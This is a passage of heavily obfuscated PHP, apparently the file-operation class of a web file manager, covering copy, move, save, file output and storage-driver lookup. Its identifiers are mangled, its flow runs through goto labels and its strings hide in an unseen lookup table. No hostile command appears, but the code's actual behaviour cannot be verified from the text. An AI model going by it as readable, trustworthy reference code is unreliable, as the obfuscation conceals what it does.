$f“™ŠÀ‡ = false) { return self::copyMoveStart($cÕñ„˜›’…, $B›³•ÚÉš„, $Cù¬÷ß®Ì, $_SERVER[¬ı§†‰ú˜¼][519], $f“™ŠÀ‡); } private static function copyMoveStart($d™›ãÁ‘Ä, $F£‘º™Éó, $cÌæï´Ù, $dŒôµˆäæ, $e²Ë„Îª) { $CšÄ§¡‡Æ =& $_SERVER[¬ı§†‰ú˜¼]; $CÆÎì‰÷¥¿ = array($d™›ãÁ‘Ä, $F£‘º™Éó, $cÌæï´Ù, $e²Ë„Îª); Hook::trigger($CšÄ§¡‡Æ[1043] . $dŒôµˆäæ . $CšÄ§¡‡Æ[1044], $CÆÎì‰÷¥¿); $b“Á¥µ»¢º = self::copyMove($d™›ãÁ‘Ä, $F£‘º™Éó, $cÌæï´Ù, $dŒôµˆäæ, $e²Ë„Îª); Hook::trigger($CšÄ§¡‡Æ[1043] . $dŒôµˆäæ . $CšÄ§¡‡Æ[1046], $CÆÎì‰÷¥¿, $b“Á¥µ»¢º); return $b“Á¥µ»¢º; } public static function saveFile($cÂĞ©§Áá, $D³Ø¦ÄÆ¡§, $eó‡÷§ˆ = true) { goto D±Àâ–Âº; e‡ë¶õÒå˜: $c¤ã½¹ëò = self::copyFile($dËÊËó, $cÂĞ©§Áá, $D·¦”ĞÃ‹Ò, $d£’ŒÂŸ÷‚, $cªÚÒÜª«Ï[$eÀÔàÆíÜ­[28]], $Aä½±¸Æª); if ($d«‡©Á„ï) { $c¤ã½¹ëò = $d«‡©Á„ï->getPathOuter($c¤ã½¹ëò); } return $c¤ã½¹ëò; goto eŞ‚É±“í­; bçøÇØœ…: $D·¦”ĞÃ‹Ò = self::driverMake($D³Ø¦ÄÆ¡§); $d«‡©Á„ï = !1; if ($D·¦”ĞÃ‹Ò->pathParse[$eÀÔàÆíÜ­[1047]]) { $CìÕàÃ„ì = $D·¦”ĞÃ‹Ò->pathParse[$eÀÔàÆíÜ­[1047]]; $d«‡©Á„ï = $D·¦”ĞÃ‹Ò; $D·¦”ĞÃ‹Ò = self::driverMake($CìÕàÃ„ì); } goto bˆù®äÌŒå; D±Àâ–Âº: $eÀÔàÆíÜ­ =& $_SERVER[¬ı§†‰ú˜¼]; $cªÚÒÜª«Ï = self::info($D³Ø¦ÄÆ¡§); $dËÊËó = self::driverMake($cÂĞ©§Áá); goto bçøÇØœ…; bˆù®äÌŒå: $d£’ŒÂŸ÷‚ = $D·¦”ĞÃ‹Ò->pathFather($D³Ø¦ÄÆ¡§); $Aä½±¸Æª = !0; if (!$eó‡÷§ˆ && self::driverIsSame($dËÊËó, $D·¦”ĞÃ‹Ò)) { $Aä½±¸Æª = !1; } goto e‡ë¶õÒå˜; eŞ‚É±“í­: } private static function copyMove($FçÕº‹•ä«, $C‡öï¥¹¨“, $E‘´­Á÷, $F±’ÂÔ›ïÑ, $E™©íù“…× = false) { goto d¾É÷Í·–×; d¾É÷Í·–×: $a¤ÛíÒ ë =& $_SERVER[¬ı§†‰ú˜¼]; if (!$FçÕº‹•ä« || $FçÕº‹•ä« == $a¤ÛíÒ ë[8] || !$C‡öï¥¹¨“) { return !1; } ignore_timeout(); goto b’ó·Ö‰¢Õ; e¦†ËÌ‘†: $C³‡·Ğëˆá = !1; if ($e…§İ·Ì­->pathParse[$a¤ÛíÒ ë[1047]]) { $C‡öï¥¹¨“ = $e…§İ·Ì­->pathParse[$a¤ÛíÒ ë[1047]]; $C³‡·Ğëˆá = $e…§İ·Ì­; $e…§İ·Ì­ = self::driverMake($C‡öï¥¹¨“); } self::check($eâ‹š­ñ¡ç, $FçÕº‹•ä«, $e…§İ·Ì­, $C‡öï¥¹¨“); goto a½´ÃšŠÎ; dÈâÁŠå“Ü: $B£é´¯ìİ = $eâ‹š­ñ¡ç->isFile($FçÕº‹•ä«); if (!$B£é´¯ìİ && $e…§İ·Ì­->getType() == $a¤ÛíÒ ë[719] && $eâ‹š­ñ¡ç->getType() == $a¤ÛíÒ ë[106]) { $Dá£æ½¼×› = $e…§İ·Ì­->copyFolderFromIO($eâ‹š­ñ¡ç, $FçÕº‹•ä«, $C‡öï¥¹¨“, $E‘´­Á÷, $aøã¼æ›Ë‘, $E™©íù“…×); } else { $Dá£æ½¼×› = self::copyPath($eâ‹š­ñ¡ç, $FçÕº‹•ä«, $e…§İ·Ì­, $C‡öï¥¹¨“, $E‘´­Á÷, $aøã¼æ›Ë‘, $B£é´¯ìİ, $E™©íù“…×); } if ($Dá£æ½¼×› && $aøã¼æ›Ë‘) { $eâ‹š­ñ¡ç->remove($FçÕº‹•ä«); } goto cùÚª‹í¥¡; a½´ÃšŠÎ: Hook::trigger($a¤ÛíÒ ë[73], $eâ‹š­ñ¡ç, $FçÕº‹•ä«, $e…§İ·Ì­, $C‡öï¥¹¨“); $AÚŠİæÚ” = self::driverIsSame($eâ‹š­ñ¡ç, $e…§İ·Ì­); if ($AÚŠİæÚ”) { if ($F±’ÂÔ›ïÑ == $a¤ÛíÒ ë[519] && !method_exists($e…§İ·Ì­, $a¤ÛíÒ ë[1048]) && trim($C‡öï¥¹¨“, $a¤ÛíÒ ë[8]) == trim($e…§İ·Ì­->pathFather($FçÕº‹•ä«), $a¤ÛíÒ ë[8])) { if ($eâ‹š­ñ¡ç->pathThis($FçÕº‹•ä«) != $E™©íù“…× && !$eâ‹š­ñ¡ç->isTypeObject()) { return $eâ‹š­ñ¡ç->rename($FçÕº‹•ä«, $E™©íù“…×); } return $e…§İ·Ì­->getPathOuter($FçÕº‹•ä«); } if (method_exists($e…§İ·Ì­, $F±’ÂÔ›ïÑ)) { return $e…§İ·Ì­->{$F±’ÂÔ›ïÑ}($FçÕº‹•ä«, $C‡öï¥¹¨“, $E‘´­Á÷); } } goto dÈâÁŠå“Ü; cùÚª‹í¥¡: if ($C³‡·Ğëˆá) { $Dá£æ½¼×› = $C³‡·Ğëˆá->getPathOuter($Dá£æ½¼×›); } return $Dá£æ½¼×›; goto F¸³À‹²; b’ó·Ö‰¢Õ: $eâ‹š­ñ¡ç = self::driverMake($FçÕº‹•ä«); $e…§İ·Ì­ = self::driverMake($C‡öï¥¹¨“); $aøã¼æ›Ë‘ = $F±’ÂÔ›ïÑ == $a¤ÛíÒ ë[519]; goto e¦†ËÌ‘†; F¸³À‹²: } private static function check($Cô‚‡¯å«È, $Eô±Ã¼ìİÕ, $bÚÏé‰ÍÀ´, &$Fß®Òµ´­±) { $Dº‚ÓÚ¤Ïç =& $_SERVER[¬ı§†‰ú˜¼]; if (self::driverIsSame($Cô‚‡¯å«È, $bÚÏé‰ÍÀ´) && $Cô‚‡¯å«È->isFolder($Eô±Ã¼ìİÕ) && $Cô‚‡¯å«È->isParentOf($Eô±Ã¼ìİÕ, $Fß®Òµ´­±)) { show_json(LNG($Dº‚ÓÚ¤Ïç[1049]), !1); } if (!$Cô‚‡¯å«È->exist($Eô±Ã¼ìİÕ)) { show_json(LNG($Dº‚ÓÚ¤Ïç[105]), !1); } } private static function copyPath($aå“®ƒÊÉ¦, $EáÏ÷Â„âÎ, $C¾Š¡›‡Šö, $f•ë‰½„×É, $EŸğ¡æ, $DØÁßéÃ©›, $DîŒ•éÎ‹„, $fù ÷æç‘Ü = false) { goto FùòˆÀá…ö; C³Ï¥£·Â‹: if ($DîŒ•éÎ‹„) { return self::copyFile($aå“®ƒÊÉ¦, $EáÏ÷Â„âÎ, $C¾Š¡›‡Šö, $f•ë‰½„×É, $DšŞ°ÈŞ½Ú, $DØÁßéÃ©›); } if ($EŸğ¡æ == REPEAT_RENAME_FOLDER) { $EŸğ¡æ = !1; } $C¥‡²å×ƒÑ = rtrim($f•ë‰½„×É, $A½•¬ó˜˜[8]) . $A½•¬ó˜˜[8] . $DšŞ°ÈŞ½Ú; goto e©˜îÚä¡©; Dº¹´×¬á: self::copyMoveKeepInfo($aå“®ƒÊÉ¦, $EáÏ÷Â„âÎ, $a‰Óƒ›ƒ¨ã); return $a‰Óƒ›ƒ¨ã; goto E«‘Â¿·ñ»; AÎ’‚¸Í“à: $Få™¡ˆ¾½‚ = is_array($Få™¡ˆ¾½‚) ? $Få™¡ˆ¾½‚ : array($A½•¬ó˜˜[74] => array(), $A½•¬ó˜˜[75] => array()); $C”Ö’Î–æ  = array_merge($Få™¡ˆ¾½‚[$A½•¬ó˜˜[74]], $Få™¡ˆ¾½‚[$A½•¬ó˜˜[75]]); foreach ($C”Ö’Î–æ  as $CÕÅÙïé¹Ç) { $eÁ©ÏäŠ³Ø = $CÕÅÙïé¹Ç[$A½•¬ó˜˜[29]] == $A½•¬ó˜˜[192]; $EáÏ÷Â„âÎ = $aå“®ƒÊÉ¦->getPathInner($CÕÅÙïé¹Ç[$A½•¬ó˜˜[76]]); $cøß‘Õíö = self::copyPath($aå“®ƒÊÉ¦, $EáÏ÷Â„âÎ, $C¾Š¡›‡Šö, $f•ë‰½„×É, $EŸğ¡æ, $DØÁßéÃ©›, $eÁ©ÏäŠ³Ø); if (!$cøß‘Õíö) { IO::errorTips($A½•¬ó˜˜[1050] . $EáÏ÷Â„âÎ . $A½•¬ó˜˜[67] . $f•ë‰½„×É); } } goto Dº¹´×¬á; FùòˆÀá…ö: $A½•¬ó˜˜ =& $_SERVER[¬ı§†‰ú˜¼]; $DšŞ°ÈŞ½Ú = $fù ÷æç‘Ü ? $fù ÷æç‘Ü : $aå“®ƒÊÉ¦->pathThis($EáÏ÷Â„âÎ); if ($EŸğ¡æ) { $bßøÇ÷óÎƒ = $C¾Š¡›‡Šö->fileNameExist($f•ë‰½„×É, $DšŞ°ÈŞ½Ú); $DšŞ°ÈŞ½Ú = $C¾Š¡›‡Šö->fileNameAuto($f•ë‰½„×É, $DšŞ°ÈŞ½Ú, $EŸğ¡æ, !$DîŒ•éÎ‹„); $EŸğ¡æ = $bßøÇ÷óÎƒ ? $EŸğ¡æ : !1; } goto C³Ï¥£·Â‹; e©˜îÚä¡©: $a‰Óƒ›ƒ¨ã = $C¾Š¡›‡Šö->mkdir($C¾Š¡›‡Šö->getPath($C¥‡²å×ƒÑ)); $f•ë‰½„×É = $C¾Š¡›‡Šö->getPathInner($a‰Óƒ›ƒ¨ã); $Få™¡ˆ¾½‚ = $aå“®ƒÊÉ¦->listPath($EáÏ÷Â„âÎ, !0); goto AÎ’‚¸Í“à; E«‘Â¿·ñ»: } private static function copyFile($DË§Á”âŒ, $a„†¦øÀ, $eÁ©–åËò, $EŠëÑÄï—ö, $FÁÎ‘À¢Ú–, $bßÖõÊ´ñÅ) { goto D¯ñ“Á«ìç; D¯ñ“Á«ìç: $b–îÓÑ–‰ =& $_SERVER[¬ı§†‰ú˜¼]; $EŠëÑÄï—ö = $eÁ©–åËò->getPath(rtrim($EŠëÑÄï—ö, $b–îÓÑ–‰[8]) . $b–îÓÑ–‰[8] . $FÁÎ‘À¢Ú–); $AĞÓÛ¥ = $b–îÓÑ–‰[1051] . time() . rand_string(5); goto c³ „ˆƒ´Ì; c³ „ˆƒ´Ì: Hook::trigger($b–îÓÑ–‰[1052], $DË§Á”âŒ, $a„†¦øÀ, $eÁ©–åËò, $EŠëÑÄï—ö, $FÁÎ‘À¢Ú–, $AĞÓÛ¥); if (self::driverIsSame($DË§Á”âŒ, $eÁ©–åËò)) { if ($bßÖõÊ´ñÅ) { $aĞÖ¯æ†âê = $eÁ©–åËò->moveFile($a„†¦øÀ, $EŠëÑÄï—ö); } else { $aĞÖ¯æ†âê = $eÁ©–åËò->copyFile($a„†¦øÀ, $EŠëÑÄï—ö); } Hook::trigger($b–îÓÑ–‰[1053], $DË§Á”âŒ, $a„†¦øÀ, $eÁ©–åËò, $EŠëÑÄï—ö, $FÁÎ‘À¢Ú–, $aĞÖ¯æ†âê); self::copyMoveKeepInfo($DË§Á”âŒ, $a„†¦øÀ, $aĞÖ¯æ†âê); return $aĞÖ¯æ†âê; } $dæ¼Œ×£Œ² = TEMP_FILES; goto eƒÒÍ¹‘ùù; eƒÒÍ¹‘ùù: if ($GLOBALS[$b–îÓÑ–‰[6]][$b–îÓÑ–‰[88]][$b–îÓÑ–‰[761]]) { $dæ¼Œ×£Œ² = $GLOBALS[$b–îÓÑ–‰[6]][$b–îÓÑ–‰[88]][$b–îÓÑ–‰[761]]; } $bßÖõÊ´ñÅ = !0; $DÀî†İñŒ» = $dæ¼Œ×£Œ²; goto FĞ×ñ±ñí®; Eê—ù¿– ô: self::remove($Dé«£¯Ú»); Hook::trigger($b–îÓÑ–‰[1053], $DË§Á”âŒ, $a„†¦øÀ, $eÁ©–åËò, $EŠëÑÄï—ö, $FÁÎ‘À¢Ú–, $aĞÖ¯æ†âê); self::copyMoveKeepInfo($DË§Á”âŒ, $a„†¦øÀ, $aĞÖ¯æ†âê); goto bƒî·¹Û»å; FĞ×ñ±ñí®: mk_dir($DÀî†İñŒ»); $cŒ®»ê³—‹ = $DÀî†İñŒ» . $AĞÓÛ¥; $Dé«£¯Ú» = $cŒ®»ê³—‹; goto dñº÷Ö‡ù®; dñº÷Ö‡ù®: $cŒ®»ê³—‹ = $DË§Á”âŒ->download($a„†¦øÀ, $cŒ®»ê³—‹); $cŒ®»ê³—‹ = $DË§Á”âŒ->iconvApp($cŒ®»ê³—‹); $aĞÖ¯æ†âê = $eÁ©–åËò->upload($EŠëÑÄï—ö, $cŒ®»ê³—‹, $bßÖõÊ´ñÅ); goto Eê—ù¿– ô; bƒî·¹Û»å: return $aĞÖ¯æ†âê; goto E–œÌ•Ìæ; E–œÌ•Ìæ: } private static function copyMoveKeepInfo($e­çñìÒ­ˆ, $B¿¬…ïœŸÑ, $báÁ¥ÈÔÑ) { if (!$báÁ¥ÈÔÑ) { return; } $B¤µ™å‰Ô” = $e­çñìÒ­ˆ->info($B¿¬…ïœŸÑ); if (!is_array($B¤µ™å‰Ô”)) { return; } IO::setModifyTime($báÁ¥ÈÔÑ, $B¤µ™å‰Ô”[$_SERVER[¬ı§†‰ú˜¼][84]]); } public static function pathFather($a„ÓÖË Å¿) { $dªè¥à¹ = IO::init($a„ÓÖË Å¿); $Dç¡¾˜Æ‹³ = $dªè¥à¹->pathFather($dªè¥à¹->path); return $dªè¥à¹->getPathOuter($Dç¡¾˜Æ‹³); } public static function fileOut($c¿Æö¢Ì—õ, $dˆÌÇíìßÍ = false, $eó¨‹½îœ˜ = false, $f©®ìÃÕ¨Ù = '') { $eìÓÂ²½ğ‰ = self::driverMake($c¿Æö¢Ì—õ); if ($eìÓÂ²½ğ‰->isFileOutServer()) { return $eìÓÂ²½ğ‰->fileOutServer($c¿Æö¢Ì—õ, $dˆÌÇíìßÍ, $eó¨‹½îœ˜, $f©®ìÃÕ¨Ù); } return $eìÓÂ²½ğ‰->fileOut($c¿Æö¢Ì—õ, $dˆÌÇíìßÍ, $eó¨‹½îœ˜, $f©®ìÃÕ¨Ù); } public static function fileOutImage($bƒ£°ãæÎ¶, $CààÏ†Š± = 250) { $eçÅ¯á³Ÿ = array(250, 600, 1200, 3000, 5000); for ($B™½”â°¡ˆ = 0; $B™½”â°¡ˆ < count($eçÅ¯á³Ÿ); $B™½”â°¡ˆ++) { if ($B™½”â°¡ˆ == 0 && $CààÏ†Š± <= $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]) { $CààÏ†Š± = $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]; break; } else { if ($CààÏ†Š± > $eçÅ¯á³Ÿ[$B™½”â°¡ˆ - 1] && $CààÏ†Š± <= $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]) { $CààÏ†Š± = $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]; break; } else { if ($B™½”â°¡ˆ == count($eçÅ¯á³Ÿ) - 1 && $CààÏ†Š± > $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]) { $CààÏ†Š± = $eçÅ¯á³Ÿ[$B™½”â°¡ˆ]; break; } } } } $d¼‰æ¡ÍáÎ = self::driverMake($bƒ£°ãæÎ¶); if ($d¼‰æ¡ÍáÎ->isFileOutServer()) { return $d¼‰æ¡ÍáÎ->fileOutImageServer($bƒ£°ãæÎ¶, $CààÏ†Š±); } return $d¼‰æ¡ÍáÎ->fileOutImage($bƒ£°ãæÎ¶, $CààÏ†Š±); } private static function driverIsSame($eç‰ã¨¢è¡, $C…÷¿–Ş¢) { goto CÓ‘ÊÔ¤‘ö; CÓ‘ÊÔ¤‘ö: $Dé¾ˆòÔä• =& $_SERVER[¬ı§†‰ú˜¼]; $fÏöéŸµ¶Œ = $eç‰ã¨¢è¡->getType(); $EŠåÑ™¼î = $C…÷¿–Ş¢->getType(); goto eà‚£Ûäˆ; AŞíÉõø†: if ($eç‰ã¨¢è¡->pathDriver == $C…÷¿–Ş¢->pathDriver) { return !0; } return !1; goto f¸·©½ì÷ß; eà‚£Ûäˆ: if ($fÏöéŸµ¶Œ != $EŠåÑ™¼î) { return !1; } if ($fÏöéŸµ¶Œ == $Dé¾ˆòÔä•[719]) { return !0; } if ($fÏöéŸµ¶Œ == $Dé¾ˆòÔä•[106]) { return !0; } goto AŞíÉõø†; f¸·©½ì÷ß: } public static function copyUpdate($CÕõÄÁ¨™ˆ, $E¢Ø¸œÅŠë) { goto aÒĞ‘”×È; aÒĞ‘”×È: $B–­æ²í„÷ =& $_SERVER[¬ı§†‰ú˜¼]; if (!IO::exist($CÕõÄÁ¨™ˆ)) { return !1; } if (!IO::exist($E¢Ø¸œÅŠë)) { IO::mkdir($E¢Ø¸œÅŠë); } goto Eá«…Ú°¼«; Eá«…Ú°¼«: $cæêÏ”Ç = self::_listAll($CÕõÄÁ¨™ˆ); $A»Û±ò´¥ï = self::_listAll($E¢Ø¸œÅŠë); $Aë¿„±²ÄÃ = array(); goto F«²¾Î˜¿; Eõƒë™Ñ³Ï: Hook::trigger($B–­æ²í„÷[1057], $CÕõÄÁ¨™ˆ, $E¢Ø¸œÅŠë, $EâëÚ„½Î”); foreach ($aÀôƒÃ†Á as $B®Ğò¤†¥ç) { IO::mkdir($B®Ğò¤†¥ç); } foreach ($Aë¿„±²ÄÃ as $B®Ğò¤†¥ç) { IO::copy($B®Ğò¤†¥ç[$B–­æ²í„÷[1054]], $B®Ğò¤†¥ç[$B–­æ²í„÷[1055]], REPEAT_REPLACE); } goto e‹ø¡—ƒ‘Ù; F«²¾Î˜¿: $aÀôƒÃ†Á = array(); foreach ($cæêÏ”Ç as $F„“éÛ¨êï => $B®Ğò¤†¥ç) { if (isset($A»Û±ò´¥ï[$F„“éÛ¨êï])) { if ($B®Ğò¤†¥ç[$B–­æ²í„÷[77]] == 1) { continue; } if ($A»Û±ò´¥ï[$F„“éÛ¨êï][$B–­æ²í„÷[78]] == $B®Ğò¤†¥ç[$B–­æ²í„÷[78]]) { continue; } } if ($B®Ğò¤†¥ç[$B–­æ²í„÷[77]] == 1) { $aÀôƒÃ†Á[] = $E¢Ø¸œÅŠë . $B–­æ²í„÷[8] . $F„“éÛ¨êï; continue; } $aÊ‰Ş±ùÎÙ = strstr(trim($F„“éÛ¨êï, $B–­æ²í„÷[8]), $B–­æ²í„÷[8]) ? get_path_father($F„“éÛ¨êï) : $B–­æ²í„÷[33]; $Aë¿„±²ÄÃ[] = array($B–­æ²í„÷[1054] => $B®Ğò¤†¥ç[$B–­æ²í„÷[76]], $B–­æ²í„÷[1055] => rtrim($E¢Ø¸œÅŠë, $B–­æ²í„÷[8]) . $B–­æ²í„÷[8] . $aÊ‰Ş±ùÎÙ, $B–­æ²í„÷[1056] => $B®Ğò¤†¥ç); } $EâëÚ„½Î” = array($B–­æ²í„÷[192] => $Aë¿„±²ÄÃ, $B–­æ²í„÷[77] => $aÀôƒÃ†Á); goto Eõƒë™Ñ³Ï; e‹ø¡—ƒ‘Ù: } private static function _listAll($aÑ²æ…½Ç›) { $fÆ¶ñÑÒ‘¼ =& $_SERVER[¬ı§†‰ú˜¼]; $aÑ²æ…½Ç› = KodIO::clear($aÑ²æ…½Ç›); $F™å‰µ«œÙ = IO::listAll($aÑ²æ…½Ç›); foreach ($F™å‰µ«œÙ as &$f®ò…¯…‰) { $D¿„¡ÅØñá = substr($f®ò…¯…‰[$fÆ¶ñÑÒ‘¼[76]], strlen($aÑ²æ…½Ç›)); $f®ò…¯…‰[$fÆ¶ñÑÒ‘¼[1058]] = trim($D¿„¡ÅØñá, $fÆ¶ñÑÒ‘¼[8]); } unset($f®ò…¯…‰); return array_to_keyvalue($F™å‰µ«œÙ, $fÆ¶ñÑÒ‘¼[1058]); } public static function fileSubstr($CÉª‰§¼„Ì, $BœŠÛß„˜Ú, $F™£ºªºá” = false) { goto FÚ™Ÿñ´Ğî; FÚ™Ÿñ´Ğî: $D„ˆÃâÙæø =& $_SERVER[¬ı§†‰ú˜¼]; $cóšË’ªˆ· = self::driverMake($CÉª‰§¼„Ì); $AÇÓóÜ¶™é = $cóšË’ªˆ·->size($CÉª‰§¼„Ì); goto B²»­˜»ä; dô·Äæ¡Šë: if ($F™£ºªºá” === !1) { $F™£ºªºá” = $AÇÓóÜ¶™é - $BœŠÛß„˜Ú; } if ($BœŠÛß„˜Ú + $F™£ºªºá” > $AÇÓóÜ¶™é) { $F™£ºªºá” = $AÇÓóÜ¶™é - $BœŠÛß„˜Ú; } if (!$AÇÓóÜ¶™é && $cóšË’ªˆ·->getType() == $D„ˆÃâÙæø[106] && !$cóšË’ªˆ·->exist($CÉª‰§¼„Ì)) { throw new Exception($D„ˆÃâÙæø[1059] . LNG($D„ˆÃâÙæø[1060]) . $D„ˆÃâÙæø[923] . get_path_this($CÉª‰§¼„Ì) . $D„ˆÃâÙæø[33]); } goto aÏíŠ¡„¥; a§È„Ğ¾’†: if (!$b£åƒŞËË‘ && $F™£ºªºá” && isset($GLOBALS[$D„ˆÃâÙæø[1061]])) { throw new Exception($GLOBALS[$D„ˆÃâÙæø[1061]][$D„ˆÃâÙæø[1062]]); } return $b£åƒŞËË‘; goto EÜÂ×¾æ—¹; B²»­˜»ä: $a§é¥–‹íí = $BœŠÛß„˜Ú; $C‹©é‘ÙÓñ = $F™£ºªºá”; if ($BœŠÛß„˜Ú < 0) { $BœŠÛß„˜Ú = $AÇÓóÜ¶™é + $BœŠÛß„˜Ú; } goto dô·Äæ¡Šë; aÏíŠ¡„¥: if ($F™£ºªºá” <= 0) { return $D„ˆÃâÙæø[33]; } if ($BœŠÛß„˜Ú < 0 || $BœŠÛß„˜Ú >= $AÇÓóÜ¶™é || $F™£ºªºá” > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\122\145\x61\x64\x20\x65\x72\162\x6f\x72\41\x20\163\164\x61\x72\164\x3d{$BœŠÛß„˜Ú}\73\x6c\x65\x6e\147\164\150\75{$F™£ºªºá”}\73\40\163\x69\x7a\x65\x3d{$AÇÓóÜ¶™é}\73"); } $b£åƒŞËË‘ = $cóšË’ªˆ·->fileSubstr($CÉª‰§¼„Ì, $BœŠÛß„˜Ú, $F™£ºªºá”); goto a§È„Ğ¾’†; EÜÂ×¾æ—¹: } private static function driverMake(&$e×Âµœ¶­) { goto C‰ÊÎÊÃè¬; C‰ÊÎÊÃè¬: $EÌÊÀŸ…Õö =& $_SERVER[¬ı§†‰ú˜¼]; $aÂë†îØì¸ = KodIO::parse($e×Âµœ¶­); if (!self::$driverListSystem) { $eŞšªéë¤¬ = Model($EÌÊÀŸ…Õö[728])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eŞšªéë¤¬, $EÌÊÀŸ…Õö[392]); } goto fàî‰¡£ª; a–æ§äíò: return $aºî‰Úï”; goto DÏè¸öÚÇ´; fàî‰¡£ª: if ($aÂë†îØì¸[$EÌÊÀŸ…Õö[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aÂë†îØì¸[$EÌÊÀŸ…Õö[392]]]) { return !1; } $e×Âµœ¶­ = $aÂë†îØì¸[$EÌÊÀŸ…Õö[1063]]; $aºî‰Úï” = self::driverGet($aÂë†îØì¸, $e×Âµœ¶­); goto a–æ§äíò; DÏè¸öÚÇ´: } private static function driverGet($cÖøºŠ™š, &$e¿ÁĞÎÔËù) { goto B•ÛÎ›¯¢; e¦ø¼Ú«ùµ: $B«‘ğ•¿õŞ->path = $e¿ÁĞÎÔËù; return $B«‘ğ•¿õŞ; goto DÅƒ¡¢… ç; C¸Ïâ†¯Í: switch ($cÖøºŠ™š[$d×ùØ–½Èó[29]]) { case KodIO::KOD_IO: $BŠœ½–¾ = self::$driverListSystem[$d“—‰áÔª]; break; case KodIO::KOD_SOURCE: $e¿ÁĞÎÔËù = $d“—‰áÔª . $e¿ÁĞÎÔËù; $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1066], $d×ùØ–½Èó[6] => $cÖøºŠ™š); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $E–¯Âí²î‡ = $GLOBALS[$d×ùØ–½Èó[1067]]; self::$driverListUser = array_to_keyvalue($E–¯Âí²î‡, $d×ùØ–½Èó[392]); } $BŠœ½–¾ = self::$driverListUser[$d“—‰áÔª]; break; case KodIO::KOD_SHARE_LINK: $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1068], $d×ùØ–½Èó[6] => $cÖøºŠ™š); $CÂãÛÖé” = Action($d×ùØ–½Èó[1069])->sharePathInfo($cÖøºŠ™š[$d×ùØ–½Èó[76]]); $e¿ÁĞÎÔËù = $CÂãÛÖé”[$d×ùØ–½Èó[394]]; if (!$CÂãÛÖé”[$d×ùØ–½Èó[394]]) { $cã¯¡«‰›Ô = Model($d×ùØ–½Èó[562])->getInfo($CÂãÛÖé”[$d×ùØ–½Èó[466]]); $e¿ÁĞÎÔËù = KodIO::clear($cã¯¡«‰›Ô[$d×ùØ–½Èó[1070]] . $cÖøºŠ™š[$d×ùØ–½Èó[1063]]); $cÖøºŠ™š[$d×ùØ–½Èó[464]] = $cã¯¡«‰›Ô; $cÖøºŠ™š[$d×ùØ–½Èó[1047]] = $e¿ÁĞÎÔËù; $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1071], $d×ùØ–½Èó[6] => $cÖøºŠ™š); } break; case KodIO::KOD_SHARE_ITEM: $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1072], $d×ùØ–½Èó[6] => $cÖøºŠ™š); $cã¯¡«‰›Ô = Model($d×ùØ–½Èó[562])->getInfo($cÖøºŠ™š[$d×ùØ–½Èó[392]]); if ($cã¯¡«‰›Ô[$d×ùØ–½Èó[394]] == $d×ùØ–½Èó[495]) { $e¿ÁĞÎÔËù = KodIO::clear($cã¯¡«‰›Ô[$d×ùØ–½Èó[1070]] . $cÖøºŠ™š[$d×ùØ–½Èó[1063]]); $cÖøºŠ™š[$d×ùØ–½Èó[464]] = $cã¯¡«‰›Ô; $cÖøºŠ™š[$d×ùØ–½Èó[1047]] = $e¿ÁĞÎÔËù; $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1073], $d×ùØ–½Èó[6] => $cÖøºŠ™š); } else { if (!$e¿ÁĞÎÔËù) { $e¿ÁĞÎÔËù = $cã¯¡«‰›Ô[$d×ùØ–½Èó[394]]; } } break; default: $e¿ÁĞÎÔËù = $cÖøºŠ™š[$d×ùØ–½Èó[76]]; $BŠœ½–¾ = array($d×ùØ–½Èó[1065] => $d×ùØ–½Èó[1074]); break; } $aåôÅ«·Ï = $cÖøºŠ™š[$d×ùØ–½Èó[76]]; if (!isset(self::$driverCache[$aåôÅ«·Ï])) { $bÉäĞùÚÕá = strtolower($BŠœ½–¾[$d×ùØ–½Èó[94]]); $d÷®è—ìĞÜ = $GLOBALS[$d×ùØ–½Èó[6]][$d×ùØ–½Èó[88]][$d×ùØ–½Èó[799]]; $cñÃœ†“¸… = $d×ùØ–½Èó[72] . (isset($d÷®è—ìĞÜ[$bÉäĞùÚÕá]) ? $d÷®è—ìĞÜ[$bÉäĞùÚÕá] : ucfirst($bÉäĞùÚÕá)); if (!class_exists($cñÃœ†“¸…)) { show_json("{$cñÃœ†“¸…}\x20\x6e\157\164\x20\145\170\151\163\x74\x73\x21", !1); } $cà¨°ŒˆÎ© = isset($BŠœ½–¾[$d×ùØ–½Èó[6]]) ? $BŠœ½–¾[$d×ùØ–½Èó[6]] : !1; self::$driverCache[$aåôÅ«·Ï] = new $cñÃœ†“¸…($cà¨°ŒˆÎ©); } goto bª¡Ó­ª§; B•ÛÎ›¯¢: $d×ùØ–½Èó =& $_SERVER[¬ı§†‰ú˜¼]; $e¬ùÛ¥¹ŒÉ = $cÖøºŠ™š[$d×ùØ–½Èó[1064]]; $d“—‰áÔª = $cÖøºŠ™š[$d×ùØ–½Èó[392]]; goto C¸Ïâ†¯Í; a½• ó’„: if (isset($BŠœ½–¾[$d×ùØ–½Èó[6]][$d×ùØ–½Èó[1075]])) { $B«‘ğ•¿õŞ->pathBase = rtrim($BŠœ½–¾[$d×ùØ–½Èó[6]][$d×ùØ–½Èó[1075]], $d×ùØ–½Èó[8]) . $d×ùØ–½Èó[8]; $e¿ÁĞÎÔËù = $B«‘ğ•¿õŞ->pathBase . ltrim($e¿ÁĞÎÔËù, $d×ùØ–½Èó[8]); } $e¿ÁĞÎÔËù = $B«‘ğ•¿õŞ->getPath($e¿ÁĞÎÔËù); if (isset($cÖøºŠ™š[$d×ùØ–½Èó[1047]])) { $e¿ÁĞÎÔËù = $cÖøºŠ™š[$d×ùØ–½Èó[1047]]; } goto e¦ø¼Ú«ùµ; bª¡Ó­ª§: $B«‘ğ•¿õŞ = self::$driverCache[$aåôÅ«·Ï]; $B«‘ğ•¿õŞ->pathDriver = $e¬ùÛ¥¹ŒÉ; $B«‘ğ•¿õŞ->pathBase = $d×ùØ–½Èó[33]; goto a½• ó’„; 